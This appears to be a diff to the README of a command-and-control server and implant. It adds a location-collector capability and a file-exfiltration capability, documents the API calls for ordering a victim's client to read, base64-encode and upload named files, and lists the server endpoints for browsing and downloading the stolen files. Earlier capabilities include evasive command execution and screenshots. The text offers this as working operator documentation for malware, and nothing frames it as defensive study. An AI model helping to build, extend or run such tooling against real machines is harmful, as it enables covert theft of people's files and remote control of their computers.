@@ -15,6 +15,8 @@ Capabilities are invoked by numeric command IDs:
 - `4` - Screenshot (start_screenshot)
 - `5` - Info Collector (start_info_collector)
 - `6` - Command Executor (execute_command_with_evasion)
+- `7` - Location Collector (get_location_info)
+- `8` - File Exfiltrator (exfiltrate_file)
 - `0` - No Command (idle)
 
 ## API Endpoints
@@ -150,6 +152,7 @@ The C2 server now supports passing arguments to capabilities:
 
 **Argument Usage by Capability:**
 - **Capability 6 (Command Executor)**: Full command string (e.g., `"cmd.exe /c dir C:\\"`)
+- **Capability 8 (File Exfiltrator)**: Full file path to exfiltrate (e.g., `"C:\\Users\\victim\\Documents\\secret.txt"`)
 - **Other Capabilities**: Reserved for future use (currently optional)
 
 **Client Fetches Command:**
@@ -164,6 +167,117 @@ Response:
 ```
 
 The client parses the JSON response and executes the capability with the provided arguments.
+
+## File Exfiltration
+
+The file exfiltration capability (ID 8) allows remote extraction of files from the client machine.
+
+### Sending File Exfiltration Command
+
+**POST to `/api/send_command`:**
+```json
+{
+  "client_id": "APT28_DESKTOP-ABC_JohnDoe",
+  "capability_id": 8,
+  "args": "C:\\Users\\victim\\Documents\\confidential.pdf"
+}
+```
+
+### Client Processing
+
+The client will:
+1. Receive the command with file path
+2. Read the file from disk
+3. Base64 encode the file content
+4. Send back a JSON structure (base64-encoded) containing:
+   - `filename`: Name of the file
+   - `size`: File size in bytes
+   - `content`: Base64-encoded file content
+
+### Server Storage
+
+The server automatically:
+1. Detects file exfiltration results (capability 8)
+2. Parses the JSON structure
+3. Stores file metadata and content in `exfiltrated_files` table
+4. Also stores in regular `results` table for audit
+
+### Retrieving Exfiltrated Files
+
+**List all exfiltrated files:**
+```
+GET /api/files
+GET /api/files?client_id=APT28_DESKTOP-ABC_JohnDoe
+```
+
+**Get files from specific client:**
+```
+GET /api/client/<client_id>/files
+```
+
+**Get file metadata and content:**
+```
+GET /api/files/<file_id>
+```
+
+**Download file (decoded binary):**
+```
+GET /api/files/<file_id>/download
+```
+
+### Response Format
+
+**List files response:**
+```json
+{
+  "status": "success",
+  "count": 2,
+  "files": [
+    {
+      "id": 1,
+      "client_id": "APT28_DESKTOP-ABC_JohnDoe",
+      "filename": "confidential.pdf",
+      "original_path": "C:\\Users\\victim\\Documents\\confidential.pdf",
+      "file_size": 45678,
+      "timestamp": "2026-01-01T12:00:00",
+      "ip": "192.168.1.100"
+    }
+  ]
+}
+```
+
+**Get single file response:**
+```json
+{
+  "status": "success",
+  "file": {
+    "id": 1,
+    "client_id": "APT28_DESKTOP-ABC_JohnDoe",
+    "filename": "confidential.pdf",
+    "original_path": "C:\\Users\\victim\\Documents\\confidential.pdf",
+    "file_size": 45678,
+    "content": "base64_encoded_content_here...",
+    "timestamp": "2026-01-01T12:00:00",
+    "ip": "192.168.1.100"
+  }
+}
+```
+
+### Error Handling
+
+If file cannot be read, the client returns an error message:
+```json
+{
+  "error": "Failed to open file",
+  "filepath": "C:\\nonexistent.txt"
+}
+```
+
+### Limitations
+
+- Maximum file size: 50 MB (configurable in client code)
+- Files are base64-encoded, increasing transmission size by ~33%
+- Large files may take time to transmit
 
 ## Implementation Notes
 
